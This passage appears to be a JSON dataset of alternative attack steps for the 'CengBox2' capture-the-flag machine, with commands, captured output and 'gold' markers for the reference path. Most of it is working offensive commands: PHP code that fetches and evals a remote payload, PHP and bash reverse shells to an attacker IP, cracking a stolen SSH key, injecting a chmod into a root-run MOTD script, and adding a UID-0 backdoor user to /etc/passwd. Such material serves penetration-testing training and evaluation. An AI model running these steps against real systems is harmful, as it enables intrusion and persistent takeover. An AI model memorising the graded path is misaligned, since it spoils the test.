            [
                {
                    "tactic": "Privilege Escalation",
                    "prerequisites": ["Shell access as www-data"],
                    "contraindications": [],
                    "goal": "Spawn TTY shell for better interaction",
                    "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                    "output": "www-data@cengbox:/var/www/html/admin/gila$",
                    "results": ["TTY shell spawned"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Privilege Escalation",
                    "prerequisites": ["TTY shell available"],
                    "contraindications": [],
                    "goal": "Check sudo privileges",
                    "command": "sudo -l",
                    "output": "Matching Defaults entries for www-data on cengbox:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on cengbox:\n    (swartz) NOPASSWD: /home/swartz/runphp.sh",
                    "results": ["Script /home/swartz/runphp.sh can be executed as swartz without password"],
                    "optional": false,
                    "gold": false
                }
            ]
        ]
    },
    {
        "or": [
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["Ability to run /home/swartz/runphp.sh as swartz user", "Metasploit web_delivery exploit configured for PHP payload"],
                "contraindications": [],
                "goal": "Execute PHP meterpreter payload via runphp.sh to gain swartz session",
                "command": "sudo -u swartz /home/swartz/runphp.sh\nphp -d allow_url_fopen=true -r \"eval(file_get_contents('http://192.168.1.112:8080/UKllE3psr6oVNxR', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));\"",
                "output": "Interactive mode enabled\n\nNo entry for terminal type \"unknown\";\nusing dumb terminal settings.\nphp > php -d allow_url_fopen=true -r \"eval(file_get_contents('http://192.168.1.112:8080/UKllE3psr6oVNxR', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));\"\n[*] 192.168.1.104:43852 Request received for /UKllE3psr6oVNxR...\n[*] Sending stage (38288 bytes) to 192.168.1.104\n[*] Meterpreter session 1 opened (192.168.1.112:8888 -> 192.168.1.104:43852)",
                "results": ["Meterpreter session established as swartz user"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["Ability to run /home/swartz/runphp.sh as swartz user", "Netcat listener on attacker machine (nc -lvp 6666)"],
                "contraindications": [],
                "goal": "Execute PHP reverse shell via runphp.sh to gain swartz session",
                "command": "sudo -u swartz /home/swartz/runphp.sh\nphp -r '$sock=fsockopen(\"192.168.1.112\",6666);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "output": "Interactive mode enabled\n\nNo entry for terminal type \"unknown\";\nusing dumb terminal settings.\nphp > php -r '$sock=fsockopen(\"192.168.1.112\",6666);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\nConnection from 192.168.1.104 received!\nsh: 0: can't access tty; job control turned off\n$ id\nuid=1001(swartz) gid=1002(developers) groups=1002(developers)",
                "results": ["Reverse shell connection established as swartz user"],
                "optional": false,
                "gold": false
            },
            [
                {
                    "tactic": "Privilege Escalation",
                    "prerequisites": ["Ability to run /home/swartz/runphp.sh as swartz user"],
                    "contraindications": [],
                    "goal": "Examine runphp.sh script for exploitation potential",
                    "command": "cat /home/swartz/runphp.sh",
                    "output": "#!/bin/bash\necho \"Interactive mode enabled\"\nexport TERM=dumb\nphp -a",
                    "results": ["Script launches interactive PHP shell", "Can be used to execute PHP commands as swartz user"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Privilege Escalation",
                    "prerequisites": ["Understanding of runphp.sh functionality", "SSH key generation capability"],
                    "contraindications": [],
                    "goal": "Add SSH public key to swartz authorized_keys",
                    "command": "ssh-keygen -t rsa -f swartz_key -N '' && sudo -u swartz /home/swartz/runphp.sh\nphp -r 'file_put_contents(\"/home/swartz/.ssh/authorized_keys\", file_get_contents(\"http://192.168.1.112:8000/swartz_key.pub\"));'",
                    "output": "Generating public/private rsa key pair.\nYour identification has been saved in swartz_key.\nYour public key has been saved in swartz_key.pub.\n\nInteractive mode enabled\n\nNo entry for terminal type \"unknown\";\nusing dumb terminal settings.\nphp > php -r 'file_put_contents(\"/home/swartz/.ssh/authorized_keys\", file_get_contents(\"http://192.168.1.112:8000/swartz_key.pub\"));'\nphp >",
                    "results": ["SSH public key added to swartz authorized_keys", "SSH access now available as swartz user"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Lateral Movement",
                    "prerequisites": ["SSH key added to swartz authorized_keys"],
                    "contraindications": [],
                    "goal": "Login as swartz via SSH",
                    "command": "ssh -i swartz_key swartz@192.168.1.104",
                    "output": "Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-142-generic x86_64)\n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\nLast login: Tue May 26 07:10:33 2020 from 192.168.0.14\nswartz@cengbox:~$",
                    "results": ["SSH session established as swartz user"],
                    "optional": false,
                    "gold": false
                }
            ]
        ]
    },
    {
        "or": [
            {
                "tactic": "Credential Access",
                "prerequisites": ["Meterpreter session as swartz user", "Access to /home/mitnick/.ssh directory"],
                "contraindications": [],
                "goal": "Extract and crack SSH private key for mitnick user",
                "command": "cat /home/mitnick/.ssh/id_rsa > key\n/usr/share/john/ssh2john.py key > hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash",
                "output": "Using default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress \" \" or Ctrl-C to abort, almost any other key for status\nlegend           (key)\nWarning: Only 2 candidates left, minimum 4 needed for performance.\n1g 0:00:00:04 DONE (2020-06-02 13:37) 0.2040g/s 2926Kp/s 2926Kc/s 2926KC/sa6_123..*7¬°Vamos!\nSession completed",
                "results": ["SSH private key passphrase cracked: legend"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Credential Access",
                "prerequisites": ["Shell access as swartz user", "Access to /home/mitnick/.ssh directory"],
                "contraindications": [],
                "goal": "Extract and crack SSH private key for mitnick user",
                "command": "python3 /opt/ssh2john/ssh2john.py /home/mitnick/.ssh/id_rsa > mitnick_hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt mitnick_hash.txt",
                "output": "Using default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress \" \" or Ctrl-C to abort, almost any other key for status\nlegend           (/home/mitnick/.ssh/id_rsa)\n1g 0:00:00:04 DONE (2020-06-02 13:37) 0.2040g/s 2926Kp/s 2926Kc/s 2926KC/sa6_123..*7¬°Vamos!\nSession completed",
                "results": ["SSH private key passphrase cracked: legend"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Credential Access",
                "prerequisites": ["Shell access as swartz user", "Access to /home/mitnick/.ssh directory"],
                "contraindications": [],
                "goal": "Extract and crack SSH private key for mitnick user",
                "command": "cp /home/mitnick/.ssh/id_rsa /tmp/mitnick_key && python3 -c \"import sys; sys.path.append('/usr/share/john'); from ssh2john import *; process('/tmp/mitnick_key')\" > /tmp/hash && hashcat -m 22921 -a 0 /tmp/hash /usr/share/wordlists/rockyou.txt",
                "output": "hashcat (v6.1.1) starting...\n\nOpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n$sshng$1$16$...:legend\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: RSA/DSA/EC/OPENSSH Private Keys\nHash.Target......: $sshng$1$16$...\nTime.Started.....: Tue Jun 02 13:37:01 2020 (4 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)",
                "results": ["SSH private key passphrase cracked: legend"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Credential Access",
                "prerequisites": ["Shell access as swartz user", "Access to /home/mitnick/.ssh directory"],
                "contraindications": ["SSH key requires passphrase"],
                "goal": "Attempt to use SSH private key without password",
                "command": "cp /home/mitnick/.ssh/id_rsa /tmp/mitnick_key && chmod 600 /tmp/mitnick_key && ssh -i /tmp/mitnick_key mitnick@localhost",
                "output": "Enter passphrase for key '/tmp/mitnick_key':",
                "results": [],
                "optional": false,
                "gold": false
            }
        ]
    },
    {
        "or": [
            {
                "tactic": "Lateral Movement",
                "prerequisites": ["SSH private key for mitnick user", "SSH key passphrase: legend", "pspy64s downloaded to /tmp"],
                "contraindications": [],
                "goal": "Login as mitnick user and enumerate system processes",
                "command": "ssh -i key mitnick@192.168.1.104\ncd /tmp\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s\nchmod 777 pspy64s\n./pspy64s",
                "output": "Enter passphrase for key 'key': \n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n177 packages can be updated.\n130 updates are security updates.\n\nLast login: Tue May 26 07:12:16 2020 from 192.168.0.14\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nmitnick@cengbox:~$ cd /tmp\nmitnick@cengbox:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s\n--2020-06-02 10:39:04-- https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s\nResolving github.com (github.com)... 13.234.210.38\nConnecting to github.com (github.com)|13.234.210.38|:443... connected.\nHTTP request sent, awaiting response... 302 Found\nLength: 1156536 (1.1M) [application/octet-stream]\nSaving to: 'pspy64s'\n\npspy64s                     100%[===========================================>]   1.10M   235KB/s    in 5.0s\n\n2020-06-02 10:39:10 (235 KB/s) - 'pspy64s' saved [1156536/1156536]\n\nmitnick@cengbox:/tmp$ chmod 777 pspy64s\nmitnick@cengbox:/tmp$ ./pspy64s\npspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855\n\nPID=1946   /bin/sh -c /bin/cp /var/update-motd.d/* /etc/update-motd.d\nPID=1945   |/usr/sbin/cron -f",
                "results": ["Cron job discovered copying files to /etc/update-motd.d", "MOTD files in /etc/update-motd.d are writable by developers group"],
                "optional": false,
                "gold": true
            },
            [
                {
                    "tactic": "Lateral Movement",
                    "prerequisites": ["SSH private key for mitnick user", "SSH key passphrase: legend"],
                    "contraindications": [],
                    "goal": "Login as mitnick user",
                    "command": "ssh -i key mitnick@192.168.1.104",
                    "output": "Enter passphrase for key 'key': \n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n177 packages can be updated.\n130 updates are security updates.\n\nLast login: Tue May 26 07:12:16 2020 from 192.168.0.14\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nmitnick@cengbox:~$",
                    "results": ["SSH session established as mitnick user"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Reconnaissance",
                    "prerequisites": ["SSH access as mitnick user"],
                    "contraindications": [],
                    "goal": "Check user groups and permissions",
                    "command": "id && find /etc -writable -type f 2>/dev/null | head -20",
                    "output": "uid=1000(mitnick) gid=1002(developers) groups=1002(developers)\n/etc/update-motd.d/00-header\n/etc/update-motd.d/10-help-text\n/etc/update-motd.d/50-motd-news\n/etc/update-motd.d/51-cloudguest\n/etc/update-motd.d/90-updates-available\n/etc/update-motd.d/91-release-upgrade\n/etc/update-motd.d/95-hwe-eol\n/etc/update-motd.d/97-overlayroot\n/etc/update-motd.d/98-fsck-at-reboot\n/etc/update-motd.d/98-reboot-required",
                    "results": ["Mitnick is member of developers group", "MOTD files in /etc/update-motd.d are writable"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Reconnaissance",
                    "prerequisites": ["Writable MOTD files discovered"],
                    "contraindications": [],
                    "goal": "Monitor for cron jobs involving MOTD",
                    "command": "wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s -O /tmp/pspy64s && chmod +x /tmp/pspy64s && /tmp/pspy64s",
                    "output": "--2020-06-02 10:39:04-- https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s\nResolving github.com (github.com)... 13.234.210.38\nConnecting to github.com (github.com)|13.234.210.38|:443... connected.\nHTTP request sent, awaiting response... 302 Found\nLength: 1156536 (1.1M) [application/octet-stream]\nSaving to: '/tmp/pspy64s'\n\n/tmp/pspy64s               100%[===========================================>]   1.10M   235KB/s    in 5.0s\n\n2020-06-02 10:39:10 (235 KB/s) - '/tmp/pspy64s' saved [1156536/1156536]\n\npspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855\n\nPID=1946   /bin/sh -c /bin/cp /var/update-motd.d/* /etc/update-motd.d\nPID=1945   |/usr/sbin/cron -f",
                    "results": ["Cron job discovered copying files to /etc/update-motd.d", "MOTD files in /etc/update-motd.d are writable by developers group"],
                    "optional": false,
                    "gold": false
                }
            ],
            [
                {
                    "tactic": "Lateral Movement",
                    "prerequisites": ["SSH private key for mitnick user", "SSH key passphrase: legend"],
                    "contraindications": [],
                    "goal": "Login as mitnick user",
                    "command": "chmod 600 key && ssh -i key mitnick@192.168.1.104",
                    "output": "Enter passphrase for key 'key': \n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n177 packages can be updated.\n130 updates are security updates.\n\nLast login: Tue May 26 07:12:16 2020 from 192.168.0.14\nmitnick@cengbox:~$",
                    "results": ["SSH session established as mitnick user"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Reconnaissance",
                    "prerequisites": ["SSH access as mitnick user"],
                    "contraindications": [],
                    "goal": "Transfer and run LinPEAS for privilege escalation enumeration",
                    "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                    "output": "                     ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ LinPEAS v3.4.0 ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n                     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\n\n[+] System Information\nHostname: cengbox\nKernel: Linux 4.4.0-142-generic\n\n[+] Interesting GROUP writable files (not in Home)\n/etc/update-motd.d/00-header\n/etc/update-motd.d/10-help-text\n...\n\n[+] Cron jobs\n* * * * * root /bin/cp /var/update-motd.d/* /etc/update-motd.d\n\n[+] MOTD scripts are writable and executed at login",
                    "results": ["MOTD files in /etc/update-motd.d are writable by developers group", "Cron job copies files to /etc/update-motd.d periodically", "MOTD scripts executed at SSH login"],
                    "optional": false,
                    "gold": false
                }
            ]
        ]
    },
    {
        "or": [
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["Write access to /etc/update-motd.d/00-header", "Mitnick user is member of developers group"],
                "contraindications": [],
                "goal": "Modify MOTD header to add SUID bit to nano binary",
                "command": "echo 'chmod u+s /bin/nano' >> /etc/update-motd.d/00-header",
                "output": "",
                "results": ["Command 'chmod u+s /bin/nano' added to /etc/update-motd.d/00-header"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["Write access to /etc/update-motd.d/00-header", "Mitnick user is member of developers group"],
                "contraindications": [],
                "goal": "Modify MOTD header to add SUID bit to vim binary",
                "command": "echo 'chmod u+s /usr/bin/vim.basic' >> /etc/update-motd.d/00-header",
                "output": "",
                "results": ["Command 'chmod u+s /usr/bin/vim.basic' added to /etc/update-motd.d/00-header"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["Write access to /etc/update-motd.d/00-header", "Mitnick user is member of developers group"],
                "contraindications": [],
                "goal": "Modify MOTD header to create reverse shell as root",
                "command": "echo 'bash -c \"bash -i >& /dev/tcp/192.168.1.112/7777 0>&1\"' >> /etc/update-motd.d/00-header",
                "output": "",
                "results": ["Reverse shell command added to /etc/update-motd.d/00-header"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["Write access to /etc/update-motd.d/00-header", "Mitnick user is member of developers group"],
                "contraindications": [],
                "goal": "Modify MOTD header to copy bash with SUID",
                "command": "echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /etc/update-motd.d/00-header",
                "output": "",
                "results": ["Command to create SUID bash copy added to /etc/update-motd.d/00-header"],
                "optional": false,
                "gold": false
            }
        ]
    },
    {
        "or": [
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["MOTD header modified to set SUID on nano", "SSH access as mitnick user"],
                "contraindications": [],
                "goal": "Trigger MOTD execution and verify nano has SUID permissions",
                "command": "exit\nssh -i key mitnick@192.168.1.104\nls -la /bin/nano",
                "output": "logout\nConnection to 192.168.1.104 closed.\nroot@kali:~# ssh -i key mitnick@192.168.1.104\nEnter passphrase for key 'key':\n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n177 packages can be updated.\n130 updates are security updates.\n\nNew release '18.04.4 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\nLast login: Tue Jun 2 10:38:44 2020 from 192.168.1.112\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nmitnick@cengbox:~$ ls -la /bin/nano\n-rwsr-xr-x 1 root root 208480 Feb 15 2017 /bin/nano",
                "results": ["nano binary now has SUID bit set (rwsr-xr-x)"],
                "optional": false,
                "gold": true
            },
            [
                {
                    "tactic": "Privilege Escalation",
                    "prerequisites": ["MOTD header modified to set SUID on nano"],
                    "contraindications": [],
                    "goal": "Wait for cron to copy modified MOTD file",
                    "command": "sleep 70",
                    "output": "",
                    "results": ["Waited for cron job to execute"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Privilege Escalation",
                    "prerequisites": ["Cron job executed"],
                    "contraindications": [],
                    "goal": "Trigger MOTD by logging out and back in",
                    "command": "exit\nssh -i key mitnick@192.168.1.104\nls -la /bin/nano",
                    "output": "logout\nConnection to 192.168.1.104 closed.\nroot@kali:~# ssh -i key mitnick@192.168.1.104\nEnter passphrase for key 'key':\n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n177 packages can be updated.\n130 updates are security updates.\n\nLast login: Tue Jun 2 10:38:44 2020 from 192.168.1.112\nmitnick@cengbox:~$ ls -la /bin/nano\n-rwsr-xr-x 1 root root 208480 Feb 15 2017 /bin/nano",
                    "results": ["nano binary now has SUID bit set (rwsr-xr-x)"],
                    "optional": false,
                    "gold": false
                }
            ],
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["MOTD header modified to set SUID on nano", "SSH access as mitnick user"],
                "contraindications": [],
                "goal": "Trigger MOTD execution and verify nano has SUID permissions",
                "command": "logout\nssh -i key mitnick@192.168.1.104 'ls -la /bin/nano'",
                "output": "Connection to 192.168.1.104 closed.\nEnter passphrase for key 'key':\n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n177 packages can be updated.\n130 updates are security updates.\n\n-rwsr-xr-x 1 root root 208480 Feb 15 2017 /bin/nano\nConnection to 192.168.1.104 closed.",
                "results": ["nano binary now has SUID bit set (rwsr-xr-x)"],
                "optional": false,
                "gold": false
            }
        ]
    },
    {
        "or": [
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["nano has SUID permissions"],
                "contraindications": [],
                "goal": "Generate password hash for new root-privileged user",
                "command": "openssl passwd -1 -salt user3 pass123",
                "output": "$1$user3$rAGRVf5p2jYTqtqOW5cPu/",
                "results": ["Password hash generated: $1$user3$rAGRVf5p2jYTqtqOW5cPu/"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["nano has SUID permissions"],
                "contraindications": [],
                "goal": "Generate password hash for new root-privileged user",
                "command": "openssl passwd -6 -salt xyz hacker123",
                "output": "$6$xyz$K8QJfKTFQRpJ6I5v2Sv.LvUhg1qJL8e3yX9Nf.WZxT3uqQG5t8KpF7w2J1vZ6N3eR8tQ5L9fG2Y4K1pU7eW2v/",
                "results": ["Password hash generated: $6$xyz$K8QJfKTFQRpJ6I5v2Sv.LvUhg1qJL8e3yX9Nf.WZxT3uqQG5t8KpF7w2J1vZ6N3eR8tQ5L9fG2Y4K1pU7eW2v/"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["nano has SUID permissions"],
                "contraindications": [],
                "goal": "Generate password hash for new root-privileged user",
                "command": "python3 -c 'import crypt; print(crypt.crypt(\"pwned\", crypt.mksalt(crypt.METHOD_SHA512)))'",
                "output": "$6$7aNvDkW3WFz4QAb5$W8J9rKYhH9x8F.qE3yV4kL2wX1pQ6tU5nR7mG9bZ0cS1dT8vY4fK2jL6hN3gE9rW5uT2oP8iQ7aK4mN1bC0eX/",
                "results": ["Password hash generated: $6$7aNvDkW3WFz4QAb5$W8J9rKYhH9x8F.qE3yV4kL2wX1pQ6tU5nR7mG9bZ0cS1dT8vY4fK2jL6hN3gE9rW5uT2oP8iQ7aK4mN1bC0eX/"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["nano has SUID permissions"],
                "contraindications": [],
                "goal": "Generate password hash for new root-privileged user",
                "command": "mkpasswd -m sha-512 rootpass",
                "output": "$6$UjK3F8vP2xL9w$H4qT2rN8yV5pK1wE9xQ7fL3mJ6bG0cS8dT1vY9uR4nP7oW2kZ5hN6jM3eT8gF0lK4sP9uQ6rY1bX5cN2mW8vZ/",
                "results": ["Password hash generated: $6$UjK3F8vP2xL9w$H4qT2rN8yV5pK1wE9xQ7fL3mJ6bG0cS8dT1vY9uR4nP7oW2kZ5hN6jM3eT8gF0lK4sP9uQ6rY1bX5cN2mW8vZ/"],
                "optional": false,
                "gold": false
            }
        ]
    },
    {
        "or": [
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["SUID nano binary available", "Password hash generated for new user"],
                "contraindications": [],
                "goal": "Add new root-privileged user to /etc/passwd",
                "command": "nano /etc/passwd",
                "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\n_apt:x:105:65534::/nonexistent:/bin/false\nlxd:x:106:65534::/var/lib/lxd/:/bin/false\nmysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false\nmessagebus:x:108:112::/var/run/dbus:/bin/false\nuuidd:x:109:113::/run/uuidd:/bin/false\ndnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false\nsshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin\nmitnick:x:1000:1002:mitnick,,,:/home/mitnick:/bin/bash\nftp:x:112:119:ftp daemon,,,:/srv/ftp:/bin/false\nswartz:x:1001:1002::/home/swartz:\nraj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash",
                "results": ["New user 'raj' added to /etc/passwd with UID 0 (root privileges)"],
                "optional": false,
                "gold": true
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["SUID nano binary available"],
                "contraindications": [],
                "goal": "Modify /etc/shadow to change root password",
                "command": "nano /etc/shadow",
                "output": "root:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:18405:0:99999:7:::\ndaemon:*:18375:0:99999:7:::\nbin:*:18375:0:99999:7:::\n...",
                "results": ["Root password changed in /etc/shadow"],
                "optional": false,
                "gold": false
            },
            {
                "tactic": "Privilege Escalation",
                "prerequisites": ["SUID nano binary available"],
                "contraindications": [],
                "goal": "Modify /etc/sudoers to grant mitnick sudo rights",
                "command": "nano /etc/sudoers",
                "output": "#\n# This file MUST be edited with the 'visudo' command as root.\n#\nDefaults        env_reset\nDefaults        mail_badpass\nDefaults        secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\n\nroot    ALL=(ALL:ALL) ALL\nmitnick ALL=(ALL) NOPASSWD: ALL",
                "results": ["mitnick user granted passwordless sudo access"],
                "optional": false,
                "gold": false
            },
            [
                {
                    "tactic": "Privilege Escalation",
                    "prerequisites": ["SUID nano binary available", "Password hash generated"],
                    "contraindications": [],
                    "goal": "Create backdoor user entry",
                    "command": "echo 'hacker:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' > /tmp/newuser",
                    "output": "",
                    "results": ["Backdoor user entry prepared"],
                    "optional": false,
                    "gold": false
                },
                {
                    "tactic": "Privilege Escalation",
                    "prerequisites": ["Backdoor user entry created", "SUID nano available"],
                    "contraindications": [],
                    "goal": "Append backdoor user to /etc/passwd",
                    "command": "nano /etc/passwd",
                    "output": "root:x:0:0:root:/root:/bin/bash\n...\nswartz:x:1001:1002::/home/swartz:\nhacker:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash",
                    "results": ["New user 'hacker' added to /etc/passwd with UID 0 (root privileges)"],
                    "optional": false,
                    "gold": false
                }
            ]
        ]
    },
    {
        "tactic": "Privilege Escalation",
        "prerequisites": ["User 'raj' with root privileges added to /etc/passwd", "Password for raj user: pass123"],
        "contraindications": [],
        "goal": "Switch to raj user and obtain root access",
        "command": "su raj\ncd /root\ncat root.txt",
        "output": "Password:\nroot@cengbox:/home/mitnick# cd /root\nroot@cengbox:~# ls\nroot.txt\nroot@cengbox:~# cat root.txt\nCEngBox2\nI would be grateful for your any feedback. Feel free to contact me on Twitter @arslanbilgen_\n\n<FLAG>",
        "results": ["Root access obtained", "Root flag retrieved"],
        "optional": false,
        "gold": true
    }
]